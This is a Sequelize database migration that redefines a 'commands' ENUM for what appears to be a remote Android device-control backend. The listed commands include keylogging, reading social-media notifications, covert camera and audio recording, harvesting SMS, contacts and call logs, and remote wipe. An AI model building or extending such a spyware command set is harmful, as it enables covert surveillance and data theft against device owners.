'use strict';

module.exports = {
  up: async (queryInterface, Sequelize) => {
    // First, check if the column exists and is of type ENUM
    const [results] = await queryInterface.sequelize.query(`
      SELECT COLUMN_TYPE, IS_NULLABLE, COLUMN_DEFAULT, EXTRA
      FROM INFORMATION_SCHEMA.COLUMNS 
      WHERE TABLE_NAME = 'commands' 
      AND COLUMN_NAME = 'command'
    `);

    if (results.length === 0) {
      console.log("Column 'command' does not exist in 'commands' table");
      return;
    }

    // Update the command column to use the correct ENUM values
    await queryInterface.sequelize.query(`
      ALTER TABLE commands 
      MODIFY COLUMN command ENUM(
        'unknown', 'login', 'custom', 'push_tokens', 'push_data', 
        'start_repeat_push_data', 'stop_repeat_push_data', 'sync_app_config', 
        'push_call_logs', 'add_call_log', 'delete_call_log', 'push_contacts', 
        'add_contact', 'delete_contact', 'push_messages', 'send_message', 
        'push_file_explorer_walk', 'push_thumbnails', 'delete_file', 'push_file', 
        'push_files', 'get_pending_push_files', 'delete_pending_push_files', 
        'sync_push_files', 'push_location', 'vibrate', 'flash', 'take_picture', 
        'record_video', 'record_audio', 'push_installed_app_list', 'push_app_logs', 
        'push_device_info', 'open_app', 'make_call', 'open_deeplink', 'get_diagnosis', 
        'schedule_command', 'cancel_scheduled_command', 'start_initializer', 
        'connect_socket', 'disconnect_socket', 'run_accessibility_command', 
        'push_accessibility_keylogger', 'push_accessibility_notifications', 
        'push_accessibility_social_media', 'accessibility_nuke_social_media_database', 
        'set_device_audio', 'push_device_audio', 'play_sound', 'set_dynamic_config', 
        'push_dynamic_config', 'location_request', 'take_photo', 'get_contacts', 
        'get_sms', 'send_sms', 'get_call_logs', 'get_device_info', 'lock_device', 
        'unlock_device', 'wipe_device', 'install_app', 'uninstall_app', 
        'get_installed_apps', 'show_message'
      ) NOT NULL;
    `);
  },

  down: async (queryInterface, Sequelize) => {
    // This is the reverse migration in case you need to rollback
    // Note: We can't add the duplicate back, so this is a no-op
  }
};
